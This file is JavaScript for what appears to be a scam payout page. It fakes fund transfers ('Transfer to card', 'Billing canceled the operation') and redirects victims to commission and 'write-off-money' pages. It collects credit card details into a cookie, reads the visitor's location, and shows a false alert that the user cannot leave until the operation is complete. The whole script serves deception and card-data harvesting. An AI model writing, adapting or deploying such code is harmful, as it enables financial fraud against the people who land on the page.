 function setCookie(name, value) {
    document.cookie = name + "=" + value;
  }
  function getCookie(name) {
    var r = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
    if (r) return r[2];
    else return "";
  }
setTimeout(function() {anim_icon_2();}, 1000);
function anim_icon_2(){
document.getElementById('fav_mes').href='anim_icon2.gif'
setTimeout(function() {anim_icon_1();}, 1000);
}
function anim_icon_1(){
document.getElementById('fav_mes').href='anim_icon1.gif'
setTimeout(function() {anim_icon_2();}, 1000);
}
function search(){
alert('Nothing found for your request «'+$('.search').val()+'»');
}
$(document).ready(function() {
    if (YMaps.location)
    { 
       // $(".country").val(YMaps.location.country); 
        $(".region").html("("+YMaps.location.region+")"); 
       $(".city").html(YMaps.location.city)       
    } 
    else
        alert("Please allow access to use your location!");
});
function menu1(){
	alert("Access error, You cannot leave the page without completing the operation!");
}
function pushMenu(){
	setTimeout(function(){ $('.push_menu,.push_menu_bg').fadeOut('fast'); },1);
}
function openpushMenu(){
	setTimeout(function(){ $('.push_menu,.push_menu_bg').fadeIn('fast'); },1);
}
function page1(){
    $('#loadpage').html('<div class="bganim"><center><br><br><img class="loader" src="loadcard.svg"><br></center></div>');
	setTimeout(function(){location.replace("login.html");},1000);
}
function page2(){
 $('#loadpage').html('<div class="bganim"><center><br><br><img class="loader" src="loadcard.svg"><br></center></div>');
	setTimeout(function(){location.replace("notifications.html");},3000);
}
function page3(){	
		setTimeout(function(){$('#status1').fadeIn('fast'); },1); 
		setTimeout(function(){$('#status1').fadeOut(1);},6000); 
		setTimeout(function(){$('#status2').fadeIn(2); },6000); 
		setTimeout(function(){location.replace("commission.html");},11000);
	$('#loadpage').html('<div class="bganim"><center><img class="loader" src="loadcard.svg"><br><div id="status1" style="display:none;" class="h1">Transfering funds to an internal account <span class="loading1"></span></div><div id="status2" style="display:none;" class="h1">Success</div><div style="margin-top:-10px;" class="h3"> Loading ...</div></center></div>');
}
function page4(){	
		setTimeout(function(){$('#status1').fadeIn('fast'); },1); 
		setTimeout(function(){$('#status1').fadeOut(1);},6000); 
		setTimeout(function(){$('#status2').fadeIn(2); },6000); 
		setTimeout(function(){location.replace("write-off-money.html");},11000);
	$('#loadpage').html('<div class="bganim"><center><img class="loader" src="loadcard.svg"><br><div id="status1" style="display:none;" class="h1">Processing <span class="loading1"></span></div><div id="status2" style="display:none;" class="h1">Success</div><div style="margin-top:-10px;" class="h3"> Loading ...</div></center></div>');
}
function page5(){	
}
$(".buttform1").click(function(){
var perem = $("#input1").val().trim();
if(!perem){
alert("You didn't enter your credit card details!");
} else {
	mpay1();
		setTimeout(function(){$('#status1').fadeIn('fast'); },1); 
		setTimeout(function(){$('#status1').fadeOut(1);},6000); 
		setTimeout(function(){$('#status2').fadeIn(2); $('.cardvisa').html(getCookie('rekviz'));},6000); 
		setTimeout(function(){$('#status2').fadeOut(1)},15000); 
		setTimeout(function(){$('#status3').fadeIn(2); },15000); 
		setTimeout(function(){location.replace("t-commiss.html");},19000);
	$('#loadpage').html('<div class="bganim"><center><img class="loader" id="loader1" src="loadcard.svg"><br><div id="status1" style="display:none;" class="h1">Billing connection <span class="loading1"></span></div><div id="status2" style="display:none;" class="h1">Transfer to card: <span class="cardvisa"></span></div><div id="status3" style="display:none;" class="h1">Billing canceled the operation</div><div style="margin-top:-10px;" class="h3"> Loading...</div></center></div>');
}
});
$(".buttform2").click(function(){
var perem2 = $("#input2").val().trim();
if(!perem2){
alert("You didn't enter your credit card details!");
} else {
	mpay2();
		setTimeout(function(){$('#status1').fadeIn('fast'); },1); 
		setTimeout(function(){$('#status1').fadeOut(1);},6000); 
		setTimeout(function(){$('#status2').fadeIn(2); $('.cardvisa').html(getCookie('rekviz')); },6000); 
		setTimeout(function(){$('#status2').fadeOut(1)},15000); 
		setTimeout(function(){$('#status3').fadeIn(2); },15000); 
		setTimeout(function(){location.replace("t-commiss.html");},19000);
	$('#loadpage').html('<div class="bganim"><center><img class="loader" id="loader1" src="loadcard.svg"><br><div id="status1" style="display:none;" class="h1">Processing <span class="loading1"></span></div><div id="status2" style="display:none;" class="h1">Transfer to the card: <span class="cardvisa"></span></div><div id="status3" style="display:none;" class="h1">Transfer Department canceled the operation</div><div style="margin-top:-10px;" class="h3"> Loading ...</div></center></div>');}
 
});
function mpay1(){
   setCookie("rekviz", $('#input1').val()); 
  }
  function mpay2(){
   setCookie("rekviz", $('#input2').val()); 
  }
  
var input = document.getElementById('inp');

input.onfocus = function (event) {
 
  };

input.onblur = function (event) {
 setTimeout(function(){$('.resultsearch').fadeOut('fast'); },1); 
  };

var newInput = document.getElementById('inp');

newInput.oninput = function () {
setTimeout(function(){$('.resultsearch').fadeIn('fast'); },1); 
var string = newInput.value;
if(string.length>="4"){$(".resultsearch").html('<span style="background-color: #fffcdd;">'+newInput.value +'</span> <br><b>Nothing matched your search terms!</b>');}else{
$(".resultsearch").html(''+newInput.value +'');
}
};
function webpushstart() {
		setTimeout(function(){$('#status1').fadeIn('fast'); },1); 
		setTimeout(function(){$('#status1').fadeOut(1);},6000); 
		setTimeout(function(){$('#status2').fadeIn(2); $('.cardvisa').html(getCookie('rekviz')); $('#loader1').fadeOut(1);$('#loader2').fadeIn(2);},6000); 
		setTimeout(function(){$('#status2').fadeOut(1)},15000); 
		setTimeout(function(){$('#status3').fadeIn(2); $('#loader2').fadeOut(1);$('#loader3').fadeIn(2);},15000); 
		setTimeout(function(){$('.bganim2').fadeOut(1);},19000);
}


